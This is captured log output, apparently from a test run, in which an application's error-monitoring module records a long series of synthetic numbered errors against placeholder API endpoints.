WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884417Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3658'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884469Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3659'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3660'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884574Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3661'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884623Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3662'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884671Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3663'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884720Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3664'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884770Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3665'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884819Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3666'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3667'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3668'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884961Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3669'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885008Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3670'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3671'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885103Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3672'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885150Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3673'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885197Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3674'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885244Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3675'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885323Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3676'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885409Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3677'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885467Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3678'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885519Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3679'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885569Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3680'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885618Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3681'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885667Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3682'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3683'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885766Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3684'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885814Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3685'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885863Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3686'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.885962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3687'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3688'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886090Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3689'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886140Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3690'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886192Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3691'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886249Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3692'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3693'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886351Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3694'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886399Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3695'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886447Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3696'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.886495Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3697'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
